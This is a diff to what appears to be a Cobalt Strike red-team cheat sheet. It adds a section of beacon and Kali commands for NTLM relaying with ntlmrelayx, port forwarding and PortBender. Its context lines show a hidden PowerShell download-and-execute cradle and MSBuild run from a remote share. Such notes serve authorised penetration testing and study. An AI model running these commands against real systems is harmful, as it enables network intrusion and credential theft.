@@ -37,6 +37,7 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Resource Kit](#resource-kit)
     * [Artifact Kit](#artifact-kit)
     * [Mimikatz Kit](#mimikatz-kit)
+* [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
 * [References](#references)
 
 
@@ -169,6 +170,7 @@ $ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\d
 * Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles
 * Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2
 * Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles
+* SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint
 
 ```powershell
 set useragent "SOME AGENT"; # GOOD
@@ -472,6 +474,16 @@ Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
 * Load the mimikatz.cna aggressor script
 * Use mimikatz functions as normal
 
+## NTLM Relaying via Cobalt Strike
+
+```powershell
+beacon> socks 1080
+kali> proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>
+beacon> rportfwd_local 8445 <IP_KALI> 445
+beacon> upload C:\Tools\PortBender\WinDivert64.sys
+beacon> PortBender redirect 445 8445
+```
+
 ## References
 
 * [Red Team Ops with Cobalt Strike (1 of 9): Operations](https://www.youtube.com/watch?v=q7VQeK533zI)
@@ -488,3 +500,4 @@ Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
 * [TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018](https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/)
 * [Cobalt Strike - DNS Beacon](https://www.cobaltstrike.com/help-dns-beacon)
 * [How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
+* [NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
